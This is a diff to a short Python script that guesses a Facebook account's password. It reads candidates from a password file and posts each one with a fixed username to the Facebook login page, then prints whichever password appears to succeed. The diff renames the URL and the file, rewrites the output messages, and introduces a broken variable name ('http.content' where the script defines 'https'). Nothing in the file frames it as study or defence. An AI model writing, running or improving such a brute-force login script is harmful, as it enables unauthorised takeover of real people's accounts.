@@ -1,14 +1,14 @@
 import requests
 
-url = 'https://www.facebook.com/'
-arq = open ('password.txt', 'r').readlines()
+url = 'https://www.facebook.com/login'
+arq = open ('passwords.txt', 'r').readlines()
 
 for line in arq:
 	password = line.strip()
 	https = requests.post(url, data = {'email':'angelica.hax','pass':password , 'login':'submit'})
-	content = https.content
+	content = http.content
 	if "Search Facebook" in content:
 		print("============== PASSWORD IS:" +password+"==============")
 		break
 	else:
-		print("[-]Successfully Injected:")
+		print("[-]Password is invalid:" +password)
